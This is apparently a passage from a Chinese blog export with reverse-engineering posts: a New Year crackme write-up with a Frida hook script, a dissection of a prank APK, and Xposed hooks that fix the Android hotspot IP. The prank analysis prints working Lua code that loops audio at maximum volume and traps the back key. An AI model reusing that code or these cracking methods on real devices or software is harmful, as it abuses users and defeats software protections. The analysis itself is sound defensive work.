ȻņƄƦcƞƅřȻƞƀřƇǹÞƦćȵƀřƈNƁƦĈƞƀřƇňÞƦĉȵƄřƈƞþřȻŇbřƇǸƁřȻņƄƦcƞƄřȻņBƦcǸßřȻȵþřƈȵƀƦćȒćƝƄȵƅŔȻNƅRĉǸƅŘCņbrCȠBŔĆŅßřƇřČȵƁȵƅŔȻńþrȻƝƃrĉǸƃřȻȵÞřƈNƁƦĈņBƦcňÞƦĉȵƁřƈŇbƦĆŅÞƦcǹþƦćņƅƦcȵƀƦćŇBřƇǸƅřȻȵþřƈƞßřȻņƀƦcǸƄřȻȵƄřƈȵƀƦćņƀƦcǹÞƦćŃbƦĈNƁƦĈņƁƦcǹÞƦćNþƦĈƞßřȻřČȵƅnƃŔĆƝƃrƈǹƀŕĉŇÞrĊnƃŔĆȵƁrȼņbŔcŃƃrČǸbŔćņßRćÑƀrƇǸßřȻņƄƦcƦȼŇƅnßrćǹbRĊŅbrȻǹÞŕĊňÞƦĉřƇÑbǸþŕĉńƅŕčƞƀRȻÑBRCƝBrƈŃbřĆŃÞŖĊnƀŘÇǹƀŕĉŇƄrĊƝƃŔƇȵƄrȼŃƀrČņBrCȠþRĉňßƦcřċÑƅRĆŇþŖƇŃÞǹƅƦćȒĉŅBȵƁrȼňßŕċȠßŔčƞßřȻņƁƦcǹÞƦćřƇƞþǹÞrčņbrCnƃŔĆÑƃRCȵbŕƇņbrCnÞŔĆnBŘÇŇƅrĊŃƄrČŃBRĊƞƅřȻņƀƦcǸƃřȻȵßřƈƞßřȻƞƀřƇǸƁřȻņƄƦcƞÞřȻŇbřƇǹÞƦćNþƦĈƞƄřȻņƀƦcǸƁřȻņƄƦcƞßřȻƞƀřƇǹÞƦćȵÞřƈƞƄřȻŇBřƇǸƅřȻȵþřƈƞƅřȻȒćƝƅŃÞŖĊnBŘÇŅbrȻȠBrčǸÞRĊǸßRĊŅßŔcŃƁřĆǹbRĊȵßrȼƞbŘČŇþrĊǸÞRĊÑBRCǹƄrčńƅŕčŃƄŔCƞßřȻņƁƦcǹÞƦćȵÞřƈȓČŃƅƝƅƦcNþƦĈňßƦcņBƦcǹßƦćńßřƇňßƦcņƀƦcǸƅřȻřčȠbŅþƦcǹƅƦćȵƄřƈƞÞřȻƞƀřƇ</span><br></pre></td></tr></table></figure>
<p>拿去网站解码（不需要16进制了，所以用原本的js即可）<br>得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Well done! It seems that you have great programming skills.</span><br><span class="line"></span><br><span class="line">ȐȼŃßɌCȵƃȒȼȵbȒƈnbɌÇńßɌĈȠƃȒȻŃBȓƈȠƃȒȼȵbȒČŃBɌCňƀȒĊŇßɌcńþȓČŇƁŕƇņÞȒȻŃƄŕƇŅƅȓƇŃƃȒȼȠbȒCņƁɌCňƀȒCŅƀȒĉȠƀɌćÑbɌcŅƄɌĉņƄȒȻńƄɌĉŇÞŕƇņÞȒȻŃƄŕƇŃbȒČŃƄŕƇńBȒČnƁȓȼǸß</span><br><span class="line"></span><br><span class="line">ŗĆnƀȒćnþŕƇnþȓƇńƅɌƇƝƄřĈƝßŗƇȠbȓčȵbȒȼƞþŗcŅƅȑĉȠƁȒCŅƀɌćŃÞɌćÑßŕƇŅþȓČňBɌČŅƅȓĊǸƄɌcńƄŕƇńþȒĆȵþɌĉŇÞŕƇŃƃřčȠbřċȵƀȓCÑBřćŃBŖČȵƃɌćǸƀȓƈȠßŘčŅƄŗĉȠƄȒȼȵƅȒȻŅBȒĆƝƃȒĈÑƄȓĊņBřƇNƁɌƇƞbɌCƝßȐĉņþƦȻƝƃŗĈńƀɌCƝB</span><br><span class="line"></span><br><span class="line">;) ȐcňÞŗcŅƅȒCŅƀȒĉȠƀȒȻŃƄɌcńƄŖċŅþŕƇņÞȒȻŃƄŕƇŅþȒČŃßŘčńbƦȻŇƅɌČÑþɌƈǹƃɌĉŅßȒCŅƅȒČnBƦȻƝƃȑÇƝƄŘCNƁȐĉņþ</span><br></pre></td></tr></table></figure>

<p>继续解码就可以得到key了</p>
<h2 id="—-简单的分割线—"><a href="#—-简单的分割线—" class="headerlink" title="—-简单的分割线—-"></a>—-简单的分割线—-</h2><p>迟来的<del>新年</del>元宵快乐！</p>
<p>PS: 活动规则所限，活动结束之后才能发布解题方法</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2020吾爱破解论坛春节红包前三题 Writeup</title>
    <url>/2020/01/29/52pojie-2020-red-packet/</url>
    <content><![CDATA[<p>解题方法并不唯一，仅供参考。</p>
<h2 id="题目打包下载地址"><a href="#题目打包下载地址" class="headerlink" title="题目打包下载地址"></a>题目打包下载地址</h2><p><a href="https://down.52pojie.cn/Challenge/Happy_New_Year_2020_Challenge.rar">https://down.52pojie.cn/Challenge/Happy_New_Year_2020_Challenge.rar</a></p>
<h2 id="第一题-送分题"><a href="#第一题-送分题" class="headerlink" title="第一题 送分题"></a>第一题 送分题</h2><p>关注“吾爱破解论坛”微信公众号，回复指定字符串即可获得本题正确口令。</p>
<h2 id="第二题-Windows-初级题"><a href="#第二题-Windows-初级题" class="headerlink" title="第二题 Windows 初级题"></a>第二题 Windows 初级题</h2><p>使用<code>PEiD</code>查壳，得知该程序是<code>UPX</code>壳，并修改了区段名。于是使用<code>OD</code>脱壳，再用<code>ImportREConstructor</code>修复IAT。<br>再次查壳，得到<code>Borland Delphi v3.0 *</code>。故使用<code>IDR</code>（<a href="https://down.52pojie.cn/Tools/Disassemblers/IDR%20(Interactive%20Delphi%20Reconstructor).rar">爱盘下载地址</a>）进行分析。<br>查看窗体，定位到关键函数<code>TForm1.edtPwdChange</code>：<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/52pojie-2020-1.png"><br>其中对输入字符串进行切片，然后分别进行md5计算，并与以下字符比较：<br><code>E7EE5F4653E31955CACC7CD68E2A7839</code><br><code>ea6b2efbdd4255a9f1b3bbc6399b58f4</code><br><code>c8d46d341bea4fd5bff866a65ff8aea9</code><br>反查md5并拼接即可得到<code>52pojie2019game</code><br>输入进行校验，得到提示：<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/52pojie-2020-2.png"><br>将该字符串回复到公众号即可获得本题正确口令。</p>
<h2 id="第三题-Android-初级题"><a href="#第三题-Android-初级题" class="headerlink" title="第三题 Android 初级题"></a>第三题 Android 初级题</h2><p>使用<code>AndroidKiller</code>反编译，打开<code>MainActivity.smali</code>，发现<code>checkFlag</code>和<code>onClick</code>方法被nativie化了。<br>于是使用<code>IDA</code>打开<code>libcrack_j2c.so</code>，定位到<code>onClick</code>方法，可以发现是通过JNI反射调用Java方法。由此可以大致分析出程序流程：<br>首先获取输入框文本，对长度进行判断，为30则调用<code>checkFlag</code>方法进行检查<br>在<code>checkFlag</code>方法中，定位到关键位置：<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/52pojie-2020-3.png"><br>由此可知，安装并打开该APP后，输入30位长度的字符串，点击确定就会调用<code>equals</code>方法<br>于是使用<code>Frida</code>进行hook，打印出调用该方法的参数和实例内容，从而得到真码：<br><code>ed61f6308c74bcf35c71729d4db24c</code><br>将该字符串回复到公众号即可获得本题正确口令。<br>Frida脚本如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(Java.available)</span><br><span class="line">&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">var</span> <span class="built_in">String</span>= Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>);</span><br><span class="line">		<span class="built_in">String</span>.equals.overload(<span class="string">&quot;java.lang.Object&quot;</span>).implementation=<span class="function"><span class="keyword">function</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.toString());</span><br><span class="line">        <span class="built_in">console</span>.log(obj);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.equals(obj);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="此处应有分割线"><a href="#此处应有分割线" class="headerlink" title="此处应有分割线"></a>此处应有分割线</h2><p>祝各位身体健康，心想事成！</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>送给最好的TA app分析</title>
    <url>/2019/09/27/andlua-app-reverse/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>今天群里有人传了个apk文件，名字叫<code>送给最好的TA</code>。这是一个整人app，安装并打开会播放一段音频，并循环调节媒体音量，维持最大值。从后台划掉/卸载/关机都可以停止该程序。<br><strong>网传所谓的截图、获取设备信息并上传等行为均不存在。反编译后看到的截图相关代码实际上并没有被调用，只是打包apk时封装进去的类，关键逻辑位于main.lua中。</strong></p>
<span id="more"></span>
<h2 id="apk分析"><a href="#apk分析" class="headerlink" title="apk分析"></a>apk分析</h2><p>拿到样本之后，别急着安装运行，先看看它的目录结构。<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/andlua-app-0.png"><br>打开assets文件夹，看到有一个mp3文件以及两个加密后的lua脚本：<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/andlua-app-1.png"><br>运行app后会自动播放这个音频文件，先对它进行替换。<br>这里使用AU对该mp3进行静音处理后，重打包并签名。<br>（其实也可以替换成自己想要播放的音频）</p>
<h2 id="找到加载lua的关键函数"><a href="#找到加载lua的关键函数" class="headerlink" title="找到加载lua的关键函数"></a>找到加载lua的关键函数</h2><p>众所周知，lua脚本需要加载，而在加载之前肯定是要先解密的，所以只要找到解密函数，然后就可以把解密后的lua脚本dump出来。<br>使用<code>IDA</code>打开<code>libluajava.so</code>，经过分析找到函数<code>luaL_loadbufferx</code><br><code>luaL_loadbufferx</code>的第二个参数是加密的字节数组，第三个参数是大小，第四个参数是lua文件位置。<br>程序在这个函数中加载加密lua脚本，其中对脚本进行了解密操作。<br>根据第四个参数我们可以区分目前加载的lua脚本名称，从而选择性地dump<br>（即在函数开头下断点，查看第四个参数内容）<br><code>luaL_loadbufferx</code>函数伪代码如下：<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/andlua-app-2.png"><br>首先对输入的字节数组进行判断，如果以1B开头，且第二位不是0C，则进行解密操作，否则直接调用<code>j_lua_load</code>加载lua脚本<br>在第41行下断点即可获取到解密后的字节数组，从而dump</p>
<h2 id="动态调试进行dump"><a href="#动态调试进行dump" class="headerlink" title="动态调试进行dump"></a>动态调试进行dump</h2><p>具体步骤可以参考我之前写的文章 <a href="https://blog.xhyeax.com/2019/09/14/android-debug-onload/">IDA调试安卓so 在libart.so OpenMemory下断点</a><br><code>IDA</code>在第41行断下之后，运行python脚本dump即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line">data = idaapi.dbg_read_memory(<span class="number">0xf4daff00</span>, <span class="number">0x3000</span>)</span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&#x27;d:\\dump.lua&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">fp.write(data)</span><br><span class="line">fp.close()</span><br></pre></td></tr></table></figure>
<p>此处的<code>0xf4daff00, 0x3000</code>需要替换成解密后字节的起始地址和长度<br>长度写大一点也没事，可以再用<code>010Editor</code>删除（所以我这写的<code>0x3000</code>）</p>
<h2 id="分析lua"><a href="#分析lua" class="headerlink" title="分析lua"></a>分析lua</h2><p>由于dump出来的lua是字节码，并不是源码形式。所以还需要反编译后才能查看源码。（使用<code>unluac_2015_06_13.jar</code>进行反编译）<br><code>init.lua</code>中进行包名、版本号、主题、权限等配置</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> L0_0</span><br><span class="line">appname = <span class="string">&quot;送给最好的TA&quot;</span></span><br><span class="line">appver = <span class="string">&quot;1.0&quot;</span></span><br><span class="line">appcode = <span class="string">&quot;10&quot;</span></span><br><span class="line">appsdk = <span class="string">&quot;15&quot;</span></span><br><span class="line">path_pattern = <span class="string">&quot;&quot;</span></span><br><span class="line">packagename = <span class="string">&quot;com.sgzh.dt&quot;</span></span><br><span class="line">theme = <span class="string">&quot;Theme_DeviceDefault_Dialog_NoActionBar_MinWidth&quot;</span></span><br><span class="line">app_key = <span class="string">&quot;&quot;</span></span><br><span class="line">app_channel = <span class="string">&quot;&quot;</span></span><br><span class="line">developer = <span class="string">&quot;&quot;</span></span><br><span class="line">description = <span class="string">&quot;&quot;</span></span><br><span class="line">debugmode = <span class="literal">false</span></span><br><span class="line">L0_0 = &#123;</span><br><span class="line">  <span class="string">&quot;INTERNET&quot;</span>,</span><br><span class="line">  <span class="string">&quot;WRITE_EXTERNAL_STORAGE&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">user_permission = L0_0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>主要功能在<code>main.lua</code>中完成:</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;import&quot;</span>)</span><br><span class="line">import(<span class="string">&quot;android.app.*&quot;</span>)</span><br><span class="line">import(<span class="string">&quot;android.os.*&quot;</span>)</span><br><span class="line">import(<span class="string">&quot;android.widget.*&quot;</span>)</span><br><span class="line">import(<span class="string">&quot;android.view.*&quot;</span>)</span><br><span class="line">import(<span class="string">&quot;android.view.View&quot;</span>)</span><br><span class="line">import(<span class="string">&quot;android.content.Context&quot;</span>)</span><br><span class="line">import(<span class="string">&quot;android.media.MediaPlayer&quot;</span>)</span><br><span class="line">import(<span class="string">&quot;android.media.AudioManager&quot;</span>)</span><br><span class="line">import(<span class="string">&quot;com.androlua.Ticker&quot;</span>)</span><br><span class="line">activity.getSystemService(Context.AUDIO_SERVICE).setStreamVolume(AudioManager.STREAM_MUSIC, <span class="number">15</span>, AudioManager.FLAG_SHOW_UI)</span><br><span class="line">activity.getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_IMMERSIVE)</span><br><span class="line">m = MediaPlayer()</span><br><span class="line">m.reset()</span><br><span class="line">m.setDataSource(activity.getLuaDir() .. <span class="string">&quot;/0.mp3&quot;</span>)</span><br><span class="line">m.prepare()</span><br><span class="line">m.start()</span><br><span class="line">m.setLooping(<span class="literal">true</span>)</span><br><span class="line">ti = Ticker()</span><br><span class="line">ti.Period = <span class="number">10</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ti.onTick</span><span class="params">()</span></span></span><br><span class="line">  activity.getSystemService(Context.AUDIO_SERVICE).setStreamVolume(AudioManager.STREAM_MUSIC, <span class="number">15</span>, AudioManager.FLAG_SHOW_UI)</span><br><span class="line">  activity.getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_IMMERSIVE)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">ti.start()</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onKeyDown</span><span class="params">(A0_0, A1_1)</span></span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">string</span>.<span class="built_in">find</span>(<span class="built_in">tostring</span>(A1_1), <span class="string">&quot;KEYCODE_BACK&quot;</span>) ~= <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">    activity.getSystemService(Context.AUDIO_SERVICE).setStreamVolume(AudioManager.STREAM_MUSIC, <span class="number">15</span>, AudioManager.FLAG_SHOW_UI)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>首先设置音频源文件路径为0.mp3，使用单曲循环模式播放音频。然后使用<code>Ticker</code>循环调节媒体音量至最大值，同时拦截了返回键。<br>主要功能其实跟以前那个叫目力的app差不多。（不过今天这个apk的音频就太那啥了…）</p>
<h2 id="静音样本下载"><a href="#静音样本下载" class="headerlink" title="静音样本下载"></a>静音样本下载</h2><p><a href="https://pan.baidu.com/s/1jTUcjknxr-fwETgtEVpQSg">https://pan.baidu.com/s/1jTUcjknxr-fwETgtEVpQSg</a></p>
<h2 id="dump出来的lua"><a href="#dump出来的lua" class="headerlink" title="dump出来的lua"></a>dump出来的lua</h2><p><a href="https://pan.baidu.com/s/1X0un1jgVB6QAgPRqNu_3Wg">https://pan.baidu.com/s/1X0un1jgVB6QAgPRqNu_3Wg</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓10、11 固定Wifi热点IP (Xposed)</title>
    <url>/2021/12/06/android-10-11-hostpot-set-ip/</url>
    <content><![CDATA[<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p><a href="https://blog.xhyeax.com/2022/07/06/android-12-hostpot-set-ip/">安卓12 固定Wifi热点IP (Xposed)</a></p>
<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/XhyEax/SoftApHelper">SoftApHelper</a></p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><a href="https://blog.xhyeax.com/2021/03/01/android-9-set-hotpot-ip/">前文</a>通过分析<code>Android 9</code>源码，定位到Hook点，然后使用<code>Xposed Hook</code>，实现了Wifi热点IP的固定。</p>
<p>系统升级到<code>Android 11</code>后，发现源码有变化，插件不起作用了。于是再来操作一波。</p>
<h2 id="Hook点"><a href="#Hook点" class="headerlink" title="Hook点"></a>Hook点</h2><h3 id="安卓10"><a href="#安卓10" class="headerlink" title="安卓10"></a>安卓10</h3><p><code>android.net.ip.IpServer</code>的<code>getRandomWifiIPv4Address</code>函数。</p>
<p><a href="http://aospxref.com/android-10.0.0_r47/xref/frameworks/base/services/net/java/android/net/ip/IpServer.java#469">IpServer.java#469</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">getRandomWifiIPv4Address</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>
<h3 id="安卓11"><a href="#安卓11" class="headerlink" title="安卓11"></a>安卓11</h3><p><code>android.net.ip.IpServer</code>的<code>requestIpv4Address</code>函数。</p>
<p><a href="http://aospxref.com/android-11.0.0_r21/xref/frameworks/base/packages/Tethering/src/android/net/ip/IpServer.java#645">IpServer.java#645</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> LinkAddress <span class="title">requestIpv4Address</span><span class="params">(s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (mStaticIpv4ServerAddr != <span class="keyword">null</span>) <span class="keyword">return</span> mStaticIpv4ServerAddr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mInterfaceType == TetheringManager.TETHERING_BLUETOOTH) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LinkAddress(BLUETOOTH_IFACE_ADDR);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mPrivateAddressCoordinator.requestDownstreamAddress(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于该函数还被用于其他方式的网络共享及更换前缀，所以需要判断网络类型（<code>mInterfaceType == TETHERING_WIFI</code>）和调用者（遍历堆栈查找<code>configureIPv4</code>），最后进行替换。</p>
<span id="more"></span>
<h2 id="安卓10-1"><a href="#安卓10-1" class="headerlink" title="安卓10"></a>安卓10</h2><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>通过<a href="https://blog.xhyeax.com/2021/03/01/android-9-set-hotpot-ip/">前文</a>可知，设置热点IP的流程如下：<br>在<code>configureIPv4</code>函数中，首先调用<code>getRandomWifiIPv4Address</code>生成字符串形式的IP，然后转换为<code>LinkAddress</code>，最后调用<code>ifcg.setLinkAddress</code>设置IP地址。（其中<code>ifcg</code>类型为<code>InterfaceConfiguration</code>）</p>
<p>在源码中搜索<code>setLinkAddress</code>，可以发现有以下<a href="http://aospxref.com/android-10.0.0_r47/search?project=frameworks&full=&defs=&refs=setLinkAddress&path=&hist=&type=&xrd=&nn=1&si=refs&si=refs">几处引用</a></p>
<p>其中<code>/frameworks/base/services/net/java/android/net/ip/IpServer.java</code>调用者为<code>configureIPv4</code>函数（官方文档：<a href="https://source.android.google.cn/devices/architecture/modular-system/networking#ipservices-refactor">IP 服务重构路径</a>）</p>
<p>查看源码<a href="http://aospxref.com/android-10.0.0_r47/xref/frameworks/base/services/net/java/android/net/ip/IpServer.java#404">IpServer.java#404</a>，发现并无太大变化（增加了<code>configureDhcp</code>，<a href="https://source.android.google.cn/setup/start/android-10-release#updated_dhcp_server">已更新 DHCP 服务器</a>），仍使用<code>getRandomWifiIPv4Address</code>生成随机IP地址：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InetAddress addr = NetworkUtils.numericToInetAddress(ipAsString);</span><br><span class="line">linkAddr = <span class="keyword">new</span> LinkAddress(addr, prefixLen);</span><br><span class="line">ifcg.setLinkAddress(linkAddr);</span><br></pre></td></tr></table></figure>

<p>查找<code>getRandomWifiIPv4Address</code>的交叉引用，发现还是只有这一处。因此，修改Hook类名为<code>android.net.ip.IpServer</code>即可适配安卓10</p>
<h3 id="Hook点-1"><a href="#Hook点-1" class="headerlink" title="Hook点"></a>Hook点</h3><p><code>android.net.ip.IpServer</code>的<code>getRandomWifiIPv4Address</code>函数，返回固定字符串即可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">getRandomWifiIPv4Address</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<h2 id="安卓11-1"><a href="#安卓11-1" class="headerlink" title="安卓11"></a>安卓11</h2><h3 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h3><p>搜索<code>setLinkAddress</code>，仍然只有<a href="http://aospxref.com/android-11.0.0_r21/search?project=frameworks&full=&defs=&refs=setLinkAddress&path=&hist=&type=&xrd=&nn=1&si=refs&si=refs">几处引用</a></p>
<p>相比于安卓10，<code>IpServer.java</code>和<code>WifiP2pServiceImpl.java</code>的引用消失了，变成了<code>NetdWrapper.java</code>的<code>fromStableParcel</code>和<code>setInterfaceLinkAddress</code>函数（官方文档：<a href="https://source.android.google.cn/devices/architecture/modular-system/tethering#module-boundary">模块边界</a>）</p>
<p>查找<code>fromStableParcel</code>的交叉引用，发现<code>NetdWrapper.java</code>和<code>NetworkManagementService.java</code>的<code>getInterfaceConfig</code>函数有调用。<br>查看源码，发现只有一行代码区别</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">NetworkStack.checkNetworkStackPermissionOr(mContext, CONNECTIVITY_INTERNAL);</span><br></pre></td></tr></table></figure>
<p>两者都是调用<code>mNetdService.interfaceGetCfg(iface)</code>获取配置。</p>
<p>查找<code>setInterfaceLinkAddress</code>的交叉引用，发现并没有函数调用它</p>
<p>于是搜索<code>configureIPv4</code>，发现只有<a href="http://aospxref.com/android-11.0.0_r21/search?project=frameworks&full=&defs=&refs=configureIPv4&path=&hist=&type=&xrd=&nn=1">一处引用</a>，仍位于<code>android.net.ip.IpServer</code>类中<br>（由<code>/frameworks/base/services/net/java/android/net/ip/IpServer.java</code>移动到了<code>/frameworks/base/packages/Tethering/src/android/net/ip/IpServer.java</code>）</p>
<p>分析该函数（源代码<a href="http://aospxref.com/android-11.0.0_r21/xref/frameworks/base/packages/Tethering/src/android/net/ip/IpServer.java#596">IpServer.java#596</a>），发现有：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (enabled) &#123;</span><br><span class="line">    mLinkProperties.addLinkAddress(mIpv4Address);</span><br><span class="line">    mLinkProperties.addRoute(getDirectConnectedRoute(mIpv4Address));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而<code>mIpv4Address</code>是在<code>configureIPv4</code>函数开头设置的:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (enabled) &#123;</span><br><span class="line">    mIpv4Address = requestIpv4Address();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看<code>requestIpv4Address</code>函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> LinkAddress <span class="title">requestIpv4Address</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (mStaticIpv4ServerAddr != <span class="keyword">null</span>) <span class="keyword">return</span> mStaticIpv4ServerAddr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mInterfaceType == TetheringManager.TETHERING_BLUETOOTH) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LinkAddress(BLUETOOTH_IFACE_ADDR);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mPrivateAddressCoordinator.requestDownstreamAddress(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先判断是否设置了静态IP，如果<code>mStaticIpv4ServerAddr</code>不为空则直接使用（由<code>maybeConfigureStaticIp</code>设置）。<br>然后判断是否为蓝牙，是则使用<code>BLUETOOTH_IFACE_ADDR</code>(<code>192.168.44.1/24</code>)。<br>其他情况调用<code>mPrivateAddressCoordinator.requestDownstreamAddress(this)</code></p>
<p>后者位于<code>frameworks/base/packages/Tethering/src/com/android/networkstack/tethering/PrivateAddressCoordinator.java</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> LinkAddress <span class="title">requestDownstreamAddress</span><span class="params">(<span class="keyword">final</span> IpServer ipServer)</span> </span>&#123;</span><br><span class="line">    maybeRemoveDeprectedUpstreams();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Address would be 192.168.[subAddress]/24.</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">byte</span>[] bytes = mTetheringPrefix.getRawAddress();</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> subAddress = getRandomSubAddr();</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> subNet = (subAddress &gt;&gt; <span class="number">8</span>) &amp; BYTE_MASK;</span><br><span class="line">    bytes[<span class="number">3</span>] = getSanitizedAddressSuffix(subAddress, (<span class="keyword">byte</span>) <span class="number">0</span>, (<span class="keyword">byte</span>) <span class="number">1</span>, (<span class="keyword">byte</span>) <span class="number">0xff</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MAX_UBYTE; i++) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> newSubNet = (subNet + i) &amp; BYTE_MASK;</span><br><span class="line">        <span class="keyword">if</span> (newSubNet == BLUETOOTH_RESERVED) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        bytes[<span class="number">2</span>] = (<span class="keyword">byte</span>) newSubNet;</span><br><span class="line">        <span class="keyword">final</span> InetAddress addr;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            addr = InetAddress.getByAddress(bytes);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Invalid address, shouldn&#x27;t happen.&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> IpPrefix prefix = <span class="keyword">new</span> IpPrefix(addr, PREFIX_LENGTH);</span><br><span class="line">        <span class="comment">// Check whether this prefix is in use.</span></span><br><span class="line">        <span class="keyword">if</span> (isDownstreamPrefixInUse(prefix)) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">// Check whether this prefix is conflict with any current upstream network.</span></span><br><span class="line">        <span class="keyword">if</span> (isConflictWithUpstream(prefix)) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        mDownstreams.add(ipServer);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LinkAddress(addr, PREFIX_LENGTH);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// No available address.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Get random sub address value. Return value is in 0 ~ 0xffff. */</span></span><br><span class="line"><span class="meta">@VisibleForTesting</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getRandomSubAddr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">new</span> Random()).nextInt()) &amp; <span class="number">0xffff</span>; <span class="comment">// subNet is in 0 ~ 0xffff.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用<code>getRandomSubAddr</code>生成子网地址，然后判断是否存在与上下游冲突。</p>
<p>查找<code>requestIpv4Address</code>交叉引用，发现还会被<code>handleNewPrefixRequest</code>调用，向上追溯找到<code>onNewPrefixRequest</code>（DHCP服务器通知前缀改变时触发）</p>
